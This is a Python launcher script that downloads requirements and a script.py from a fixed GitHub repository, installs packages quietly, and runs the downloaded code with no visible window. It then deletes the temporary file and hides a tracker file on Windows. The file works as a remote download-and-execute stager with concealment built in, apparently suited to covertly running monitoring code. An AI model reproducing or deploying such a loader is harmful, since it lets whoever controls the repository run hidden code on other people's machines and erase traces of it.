# github_launcher.pyw - Downloads and runs script.py from temp, installs requirements only if needed
import os
import sys
import subprocess
import urllib.request
import tempfile
import time
import traceback
import atexit
import threading
import json

def get_requirements_tracker_path():
    """Get path to requirements tracker file in a common Windows location"""
    # Use AppData/Local which exists on all Windows versions
    appdata_local = os.getenv('LOCALAPPDATA')
    tracker_folder = os.path.join(appdata_local, "GitHubLauncher")
    
    # Create folder if it doesn't exist
    if not os.path.exists(tracker_folder):
        try:
            os.makedirs(tracker_folder, exist_ok=True)
        except:
            # Fallback to temp directory if we can't create folder
            tracker_folder = tempfile.gettempdir()
    
    return os.path.join(tracker_folder, ".requirements_installed.txt")

def are_requirements_already_installed(current_requirements):
    """Check if current requirements are already installed"""
    tracker_file = get_requirements_tracker_path()
    
    if not os.path.exists(tracker_file):
        return False
    
    try:
        with open(tracker_file, 'r', encoding='utf-8') as f:
            installed_requirements = f.read().strip()
        
        # Compare current requirements with what we have tracked
        return installed_requirements == current_requirements.strip()
    except:
        return False

def mark_requirements_installed(requirements_content):
    """Mark requirements as installed by saving to tracker file"""
    tracker_file = get_requirements_tracker_path()
    
    try:
        with open(tracker_file, 'w', encoding='utf-8') as f:
            f.write(requirements_content.strip())
        
        # Hide the file on Windows
        if os.name == 'nt':
            subprocess.run(['attrib', '+h', tracker_file], 
                         shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

def get_installed_packages():
    """Get list of currently installed packages via pip"""
    try:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "freeze"],
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.returncode == 0:
            installed_packages = {}
            for line in result.stdout.strip().split('\n'):
                if '==' in line:
                    package, version = line.split('==', 1)
                    installed_packages[package.lower()] = version
            return installed_packages
    except:
        pass
    return {}

def get_required_packages(requirements_content):
    """Parse requirements.txt content"""
    required_packages = []
    
    for line in requirements_content.strip().split('\n'):
        line = line.strip()
        # Skip comments and empty lines
        if not line or line.startswith('#'):
            continue
        
        # Extract package name (remove version specifiers)
        package = line.split('>')[0].split('<')[0].split('=')[0].split('~')[0].strip()
        if package:
            required_packages.append(package.lower())
    
    return required_packages

def check_missing_packages(requirements_content):
    """Check which required packages are not installed"""
    required = get_required_packages(requirements_content)
    installed = get_installed_packages()
    
    missing = []
    for package in required:
        if package not in installed:
            missing.append(package)
    
    return missing

def install_requirements():
    """Download and install requirements from requirements.txt only if needed"""
    try:
        # URL to requirements.txt on GitHub
        requirements_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/requirements.txt"
        
        print("Checking for requirements.txt...")
        
        # Download the requirements.txt
        response = urllib.request.urlopen(requirements_url, timeout=10)
        requirements_content = response.read().decode('utf-8').strip()
        
        if not requirements_content:
            print("requirements.txt is empty, skipping installation")
            return True
        
        # Check if we already installed these exact requirements
        if are_requirements_already_installed(requirements_content):
            print("✓ Requirements already installed (verified by tracker)")
            
            # Double-check if any packages are missing
            missing = check_missing_packages(requirements_content)
            if missing:
                print(f"⚠ Some packages missing: {', '.join(missing)}")
                print("Proceeding with installation...")
            else:
                print("✓ All required packages are installed")
                return True
        
        print("Installing required packages...")
        
        # Save requirements to temp file
        temp_dir = tempfile.gettempdir()
        temp_req = os.path.join(temp_dir, f"requirements_{int(time.time())}.txt")
        
        with open(temp_req, 'w', encoding='utf-8') as f:
            f.write(requirements_content)
        
        print(f"Requirements saved to: {temp_req}")
        
        # Run pip install in background thread
        def run_pip_install():
            try:
                # Check which packages are missing to avoid reinstalling everything
                missing_packages = check_missing_packages(requirements_content)
                
                if missing_packages:
                    print(f"Missing packages: {', '.join(missing_packages)}")
                    
                    # Create temp file with only missing packages
                    missing_req = os.path.join(temp_dir, f"missing_req_{int(time.time())}.txt")
                    
                    # Filter requirements to only include missing packages
                    with open(temp_req, 'r') as f:
                        all_lines = f.readlines()
                    
                    missing_lines = []
                    for line in all_lines:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        package_name = line.split('>')[0].split('<')[0].split('=')[0].split('~')[0].strip().lower()
                        if package_name in missing_packages:
                            missing_lines.append(line)
                    
                    if missing_lines:
                        with open(missing_req, 'w') as f:
                            f.write('\n'.join(missing_lines))
                        
                        # Install only missing packages
                        startupinfo = subprocess.STARTUPINFO()
                        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                        
                        print(f"Installing {len(missing_lines)} missing package(s)...")
                        process = subprocess.Popen(
                            [sys.executable, "-m", "pip", "install", "-r", missing_req, "--user", "--quiet"],
                            startupinfo=startupinfo,
                            creationflags=subprocess.CREATE_NO_WINDOW,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE
                        )
                        
                        # Wait for installation
                        for _ in range(60):
                            if process.poll() is not None:
                                break
                            time.sleep(1)
                        
                        try:
                            os.remove(missing_req)
                        except:
                            pass
                        
                        if process.returncode == 0:
                            print("✓ Missing packages installed successfully")
                            # Mark all requirements as installed
                            mark_requirements_installed(requirements_content)
                        else:
                            print(f"⚠ Package installation completed with code: {process.returncode}")
                    else:
                        print("✓ All packages are already installed")
                        mark_requirements_installed(requirements_content)
                else:
                    print("✓ All required packages are already installed")
                    mark_requirements_installed(requirements_content)
                
                # Clean up temp requirements file
                try:
                    os.remove(temp_req)
                except:
                    pass
                
            except Exception as e:
                print(f"Error during pip installation: {e}")
        
        # Start installation in background thread
        install_thread = threading.Thread(target=run_pip_install, daemon=True)
        install_thread.start()
        
        # Wait a bit for installation to start
        time.sleep(2)
        
        return True
        
    except urllib.error.HTTPError as e:
        if e.code == 404:
            print("requirements.txt not found in repository, skipping installation")
            return True
        else:
            print(f"Error downloading requirements.txt: {e}")
            return False
    except Exception as e:
        print(f"Error during requirements check: {e}")
        return False

def delete_temp_file(temp_script_path):
    """Try to delete the temp file with retries"""
    if not temp_script_path or not os.path.exists(temp_script_path):
        return
    
    # Try multiple times to delete the file
    for attempt in range(10):
        try:
            time.sleep(1)
            os.remove(temp_script_path)
            print(f"✓ Temp file deleted on attempt {attempt + 1}")
            return True
        except (PermissionError, OSError) as e:
            if attempt < 9:
                print(f"Attempt {attempt + 1} failed, retrying...")
                continue
            else:
                print(f"✗ Failed to delete temp file after 10 attempts")
                return False
        except Exception as e:
            print(f"Error deleting file: {e}")
            return False

def run_script_from_github():
    """Download script.py from GitHub, run it, then delete temp file"""
    temp_script = None
    try:
        # URL to script.py on GitHub
        script_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py"
        
        print("Downloading script from GitHub...")
        
        # Download the script
        response = urllib.request.urlopen(script_url, timeout=10)
        script_code = response.read().decode('utf-8')
        
        # Save to temp file with random name
        temp_dir = tempfile.gettempdir()
        timestamp = str(int(time.time()))
        temp_script = os.path.join(temp_dir, f"monitor_{timestamp}.py")
        
        # Write script to temp file
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script_code)
        
        print(f"✓ Script saved to: {temp_script}")
        
        # Register cleanup function
        atexit.register(delete_temp_file, temp_script)
        
        # Run it hidden
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        process = subprocess.Popen(
            [sys.executable, temp_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        print(f"✓ Script started with PID: {process.pid}")
        
        # Try to delete the temp file after a delay (in background)
        def delayed_delete():
            time.sleep(10)
            delete_temp_file(temp_script)
        
        delete_thread = threading.Thread(target=delayed_delete, daemon=True)
        delete_thread.start()
        
        return True
        
    except urllib.error.HTTPError as e:
        if e.code == 404:
            print("✗ script.py not found in repository")
            return False
        else:
            print(f"✗ Error downloading script: {e}")
            return False
    except Exception as e:
        print(f"✗ Error: {e}")
        traceback.print_exc()
        # Clean up temp file if we created it but failed to run
        if temp_script and os.path.exists(temp_script):
            try:
                os.remove(temp_script)
            except:
                pass
        return False

def main():
    """Main launcher function"""
    print("=" * 60)
    print("GitHub Auto-Deploy Launcher")
    print("=" * 60)
    
    # Step 1: Install requirements (only if needed)
    print("\n[1/2] Checking requirements...")
    install_requirements()
    
    # Step 2: Wait a moment
    print("\n[2/2] Starting main script...")
    time.sleep(1)
    
    # Run the script
    success = run_script_from_github()
    
    if success:
        print("\n" + "=" * 60)
        print("✓ Launcher completed successfully")
        print("=" * 60)
    else:
        print("\n" + "=" * 60)
        print("✗ Launcher encountered errors")
        print("=" * 60)
    
    # Keep launcher alive for a bit
    time.sleep(5)
    
    # Exit
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
